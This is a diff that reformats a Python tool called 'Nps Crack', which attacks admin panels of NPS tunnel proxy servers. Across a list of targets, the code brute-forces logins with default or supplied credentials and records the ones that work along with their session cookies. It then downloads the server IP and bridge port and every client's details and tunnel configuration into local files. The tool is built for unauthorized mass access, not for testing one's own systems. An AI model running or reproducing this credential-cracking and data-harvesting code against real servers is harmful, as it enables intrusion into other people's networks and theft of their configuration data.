@@ -2,7 +2,7 @@
 Author         : Sp4ce
 Date           : 2020-11-23 11:31:02
 LastEditors    : Sp4ce
-LastEditTime   : 2020-11-26 11:05:51
+LastEditTime   : 2020-11-26 11:15:09
 Description    : Challenge Everything.
 '''
 import argparse
@@ -16,11 +16,12 @@ import sys
 from urllib.parse import urlparse
 import requests
 import urllib3
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(lineno)d - %(message)s ')
+    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(lineno)d - %(message)s "
+)
 logger = logging.getLogger()
 
 USER_AGENTS = [
@@ -57,7 +58,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
-    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
+    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
 ]
 
 
@@ -71,8 +72,8 @@ class npsCrack:
         self.usernameFile = usernameFile
         self.passwordFile = passwordFile
         self.urls = []
-        self.password = ['123']
-        self.username = ['admin']
+        self.password = ["123"]
+        self.username = ["admin"]
         self.target = ""
         self.hostname = ""
         self.savePath = ""
@@ -82,19 +83,20 @@ class npsCrack:
         self.headers = {}
         self.headers["User-Agent"] = random.choice(USER_AGENTS)
         self.headers[
-            'Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
-        if not os.path.isdir('result'):
-            logger.warning('Result folder not exist. Now create.')
+            "Content-Type"
+        ] = "application/x-www-form-urlencoded; charset=UTF-8"
+        if not os.path.isdir("result"):
+            logger.warning("Result folder not exist. Now create.")
             try:
-                os.makedirs('result')
+                os.makedirs("result")
                 logger.info("Result folder create success.")
             except:
-                logger.error('Result folder create failed.')
+                logger.error("Result folder create failed.")
         else:
-            logger.debug('Result folder already exist.')
+            logger.debug("Result folder already exist.")
         logger.info("Init success.")
 
-    '''
+    """
     Request:
     POST /login/verify HTTP/1.1
     username=admin&password=123
@@ -111,36 +113,43 @@ class npsCrack:
         "msg": "username or password incorrect",
         "status": 0
     }
-    '''
+    """
 
     def checkLogin(self, url, usernameFile, passwordFile):
         data = "username={USERNAME}&password={PASSWORD}"
         for username in usernameFile:
             for passwords in passwordFile:
                 logger.info(
-                    "Try to use {USERNAME}/{PASSWORD} to sign in {TARGET}".
-                    format(USERNAME=username, PASSWORD=passwords, TARGET=url))
+                    "Try to use {USERNAME}/{PASSWORD} to sign in {TARGET}".format(
+                        USERNAME=username, PASSWORD=passwords, TARGET=url
+                    )
+                )
                 try:
-                    res = requests.post(self.loginUrl.format(URL=url),
-                                        data=data.format(USERNAME=username,
-                                                         PASSWORD=passwords),
-                                        headers=self.headers,
-                                        timeout=self.timeout,
-                                        verify=False)
+                    res = requests.post(
+                        self.loginUrl.format(URL=url),
+                        data=data.format(USERNAME=username, PASSWORD=passwords),
+                        headers=self.headers,
+                        timeout=self.timeout,
+                        verify=False,
+                    )
                     resStatus = json.loads(res.text)
-                    if resStatus['status'] == 1:
-                        with open('success.txt', 'a+') as f:
-                            f.write(url + '-----' + username + '----' +
-                                    passwords + '\n')
-                        self.loginSession = res.headers['Set-Cookie']
+                    if resStatus["status"] == 1:
+                        with open("success.txt", "a+") as f:
+                            f.write(
+                                url + "-----" + username + "----" + passwords + "\n"
+                            )
+                        self.loginSession = res.headers["Set-Cookie"]
                         self.target = url
                         logger.info("{URL} Login Success.".format(URL=url))
-                        logger.info("Get Availed Cookies : {COOKIES}".format(
-                            COOKIES=res.headers['Set-Cookie']))
+                        logger.info(
+                            "Get Availed Cookies : {COOKIES}".format(
+                                COOKIES=res.headers["Set-Cookie"]
+                            )
+                        )
                         logger.info("Parsing hostname and create folder.")
                         _url = urlparse(url)
                         hostname = _url.hostname
-                        savePath = 'result/' + str(hostname)
+                        savePath = "result/" + str(hostname)
                         self.hostname = hostname
                         self.savePath = savePath
                         if not os.path.isdir(savePath):
@@ -148,30 +157,36 @@ class npsCrack:
                                 os.makedirs(savePath)
                                 logger.info(
                                     "Create {savePath} folder success.".format(
-                                        savePath=savePath))
+                                        savePath=savePath
+                                    )
+                                )
                             except:
                                 logger.error(
                                     "Create {savePath} folder failed.".format(
-                                        savePath=savePath))
+                                        savePath=savePath
+                                    )
+                                )
                         else:
                             logger.info(
                                 "Save path [{savePath}] already exist.".format(
-                                    savePath=savePath))
+                                    savePath=savePath
+                                )
+                            )
                         logger.info("Now get clients and server info.")
                         return True
                     else:
                         logger.warning(
-                            "{URL} Login Failed with {USERNAME}/{PASSWORD}".
-                            format(URL=url,
-                                   USERNAME=username,
-                                   PASSWORD=passwords))
+                            "{URL} Login Failed with {USERNAME}/{PASSWORD}".format(
+                                URL=url, USERNAME=username, PASSWORD=passwords
+                            )
+                        )
                         pass
                 except:
                     logger.error("{URL} Connect Failed.".format(URL=url))
                     self.markFailedIp(url)
                     pass
 
-    '''
+    """
     Request:
     POST /client/list HTTP/1.1
     search=&order=asc&offset=0&limit=10
@@ -184,72 +199,74 @@ class npsCrack:
         "rows": [Array],
         "total": Int
     }
-    '''
+    """
 
     def getNpsInfo(self, url):
         data = {}
-        data['search'] = ""
-        data['order'] = "asc"
-        data['offset'] = "0"
-        data['limit'] = "10"
-        self.headers['Cookie'] = self.loginSession
+        data["search"] = ""
+        data["order"] = "asc"
+        data["offset"] = "0"
+        data["limit"] = "10"
+        self.headers["Cookie"] = self.loginSession
         try:
-            res = requests.post(self.clientUrl.format(URL=url),
-                                data=data,
-                                headers=self.headers,
-                                timeout=self.timeout,
-                                verify=False)
+            res = requests.post(
+                self.clientUrl.format(URL=url),
+                data=data,
+                headers=self.headers,
+                timeout=self.timeout,
+                verify=False,
+            )
             resJson = json.loads(res.text)
-            #logger.info(resJson)
-            totalClients = resJson['total']
-            #write server data
-            if 'ip' in resJson:
-                serverIP = resJson['ip']
-                serverBridgePort = resJson['bridgePort']
-                serverBridgeType = resJson['bridgeType']
+            # logger.info(resJson)
+            totalClients = resJson["total"]
+            # write server data
+            if "ip" in resJson:
+                serverIP = resJson["ip"]
+                serverBridgePort = resJson["bridgePort"]
+                serverBridgeType = resJson["bridgeType"]
                 logger.warning(
-                    "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}."
-                    .format(IP=serverIP,
-                            BRIDGEPORT=serverBridgePort,
-                            BRIDGETYPE=serverBridgeType))
-                saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
-                writeData = "ServerIP : " + serverIP + '\n'
-                writeData += "ServerBridgePort : " + str(
-                    serverBridgePort) + '\n'
-                writeData += "ServerBridgeType : " + serverBridgeType + '\n'
-                writeData += "Login URL : " + url + '\n'
+                    "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}.".format(
+                        IP=serverIP,
+                        BRIDGEPORT=serverBridgePort,
+                        BRIDGETYPE=serverBridgeType,
+                    )
+                )
+                saveFilename = self.savePath + "/ServerInfo-" + self.nowDate + ".txt"
+                writeData = "ServerIP : " + serverIP + "\n"
+                writeData += "ServerBridgePort : " + str(serverBridgePort) + "\n"
+                writeData += "ServerBridgeType : " + serverBridgeType + "\n"
+                writeData += "Login URL : " + url + "\n"
                 with open(saveFilename, "a+") as f:
                     f.write(writeData)
             else:
                 logger.warning("NPS server IP:{IP}".format(IP=self.hostname))
-                saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
+                saveFilename = self.savePath + "/ServerInfo-" + self.nowDate + ".txt"
                 with open(saveFilename, "a+") as f:
-                    f.write(
-                        json.dumps(resJson['rows'], indent=2) + "\nLogin URL" +
-                        url)
-            #get all client info
-            data['limit'] = totalClients
-            logger.info(
-                "Get {TOTALNUMS} clients.".format(TOTALNUMS=totalClients))
-            res = requests.post(self.clientUrl.format(URL=url),
-                                data=data,
-                                headers=self.headers,
-                                timeout=self.timeout,
-                                verify=False)
+                    f.write(json.dumps(resJson["rows"], indent=2) + "\nLogin URL" + url)
+            # get all client info
+            data["limit"] = totalClients
+            logger.info("Get {TOTALNUMS} clients.".format(TOTALNUMS=totalClients))
+            res = requests.post(
+                self.clientUrl.format(URL=url),
+                data=data,
+                headers=self.headers,
+                timeout=self.timeout,
+                verify=False,
+            )
             resJson = json.loads(res.text)
-            allRows = resJson['rows']
-            saveFilename = self.savePath + '/ClientsInfo-' + self.nowDate + '.json'
+            allRows = resJson["rows"]
+            saveFilename = self.savePath + "/ClientsInfo-" + self.nowDate + ".json"
             with open(saveFilename, "a+") as f:
                 f.write(json.dumps(allRows, indent=2))
             for row in allRows:
-                self.clientsId.append(row['Id'])
+                self.clientsId.append(row["Id"])
             self.getNpsTunnelInfo(self.target)
         except:
-            logger.error('Clients connect failed.')
+            logger.error("Clients connect failed.")
             self.markFailedIp(url)
             pass
 
-    '''
+    """
     Request:
     POST /index/gettunnel HTTP/1.1
     offset=0&limit=10&type=&client_id=2&search=
@@ -260,40 +277,42 @@ class npsCrack:
         "rows": [Array],
         "total": Int
     }
-    '''
+    """
 
     def getNpsTunnelInfo(self, url):
-        if not os.path.isdir(self.savePath + '/tunnels'):
-            logger.warning('Tunnels folder not exist,now create it.')
+        if not os.path.isdir(self.savePath + "/tunnels"):
+            logger.warning("Tunnels folder not exist,now create it.")
             try:
-                os.makedirs(self.savePath + '/tunnels')
-                logger.info('Tunnels folder create success.')
+                os.makedirs(self.savePath + "/tunnels")
+                logger.info("Tunnels folder create success.")
             except:
-                logger.error('Tunnels folder create failed.')
+                logger.error("Tunnels folder create failed.")
         data = {}
-        data['offset'] = '0'
-        data['limit'] = '10'
-        data['type'] = ''
-        data['search'] = ''
+        data["offset"] = "0"
+        data["limit"] = "10"
+        data["type"] = ""
+        data["search"] = ""
         for i in self.clientsId:
-            data['client_id'] = i
+            data["client_id"] = i
             try:
-                res = requests.post(url=self.tunnelUrl.format(URL=url),
-                                    data=data,
-                                    headers=self.headers,
-                                    timeout=self.timeout,
-                                    verify=False)
-                logger.info('Get client {CLIENTID} tunnels success.'.format(
-                    CLIENTID=i))
-                saveFilename = self.savePath + '/tunnels/Client-[' + str(
-                    i) + ']-Tunnels-Info.json'
+                res = requests.post(
+                    url=self.tunnelUrl.format(URL=url),
+                    data=data,
+                    headers=self.headers,
+                    timeout=self.timeout,
+                    verify=False,
+                )
+                logger.info("Get client {CLIENTID} tunnels success.".format(CLIENTID=i))
+                saveFilename = (
+                    self.savePath + "/tunnels/Client-[" + str(i) + "]-Tunnels-Info.json"
+                )
                 resJson = json.loads(res.text)
-                allRows = resJson['rows']
+                allRows = resJson["rows"]
                 if len(allRows) > 0:
-                    with open(saveFilename, 'a+') as f:
+                    with open(saveFilename, "a+") as f:
                         f.write(json.dumps(allRows, indent=2))
             except:
-                logger.error('Tunnels connect failed.')
+                logger.error("Tunnels connect failed.")
                 self.markFailedIp(self.tunnelUrl.format(URL=url))
                 pass
         self.clientsId = []
@@ -301,7 +320,7 @@ class npsCrack:
     def markFailedIp(self, ip):
         logger.warning("Detect connect error with {URL}".format(URL=ip))
         with open("failed.txt", "a+") as f:
-            f.write(ip + '\n')
+            f.write(ip + "\n")
 
     def run(self):
         if os.path.isfile(self.targetFile):
@@ -326,19 +345,21 @@ class npsCrack:
         else:
             self.username.append(self.usernameFile)
         logger.info(
-            "Load {0} Username(s) and {1} Password(s) For Test {2} Target(s).".
-            format(len(self.username), len(self.password), len(self.urls)))
+            "Load {0} Username(s) and {1} Password(s) For Test {2} Target(s).".format(
+                len(self.username), len(self.password), len(self.urls)
+            )
+        )
         startTime = time.process_time()
         for url in self.urls:
             if self.checkLogin(url, self.username, self.password):
                 self.getNpsInfo(self.target)
         endTime = time.process_time()
-        logger.info("All things done in {TIME} s".format(TIME=endTime -
-                                                         startTime))
+        logger.info("All things done in {TIME} s".format(TIME=endTime - startTime))
 
 
 if __name__ == "__main__":
-    print('''
+    print(
+        """
      _   _              _____                _    
     | \\ | |            / ____|              | |   
     |  \\| |_ __  ___  | |     _ __ __ _  ___| | __
@@ -347,22 +368,24 @@ if __name__ == "__main__":
     |_| \\_| .__/|___/  \\_____|_|  \\__,_|\\___|_|\\_\\
           | |                               
           |_|                 Author: Sp4ce
-    ''')
+    """
+    )
     parser = argparse.ArgumentParser()
-    parser.add_argument("-target",
-                        "--targetFile",
-                        type=str,
-                        help="Load targets file or single target.")
+    parser.add_argument(
+        "-target", "--targetFile", type=str, help="Load targets file or single target."
+    )
     parser.add_argument(
         "-username",
         "--usernameFile",
         type=str,
-        help="Load usernames file or single username.(default admin)")
+        help="Load usernames file or single username.(default admin)",
+    )
     parser.add_argument(
         "-password",
         "--passwordFile",
         type=str,
-        help="Load passwords file or single password.(default 123)")
+        help="Load passwords file or single password.(default 123)",
+    )
     args = parser.parse_args()
     if len(sys.argv) < 2:
         parser.print_help()
